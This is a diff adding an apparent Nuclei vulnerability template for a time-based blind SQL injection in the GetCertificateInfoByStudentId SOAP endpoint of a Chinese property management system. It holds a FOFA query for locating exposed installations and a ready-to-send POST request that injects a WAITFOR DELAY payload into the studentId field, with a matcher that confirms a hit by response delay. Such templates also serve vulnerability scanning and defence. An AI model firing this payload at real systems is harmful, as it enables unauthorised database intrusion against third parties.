@@ -1,0 +1,22 @@
+id: poc-fdrpkf0bl7bgg4p8
+info:
+  name: 新视窗新一代物业管理系统 GetCertificateInfoByStudentId SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fdrpkf0bl7bgg4p8
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fdrpkf0bl7bgg4p8
+    fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
+http:
+- raw:
+  - "POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetCertificateInfoByStudentId\"\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetCertificateInfoByStudentId xmlns=\"http://tempuri.org/\">\n      <studentId>1;WAITFOR DELAY '0:0:5'--</studentId>\n    </GetCertificateInfoByStudentId>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
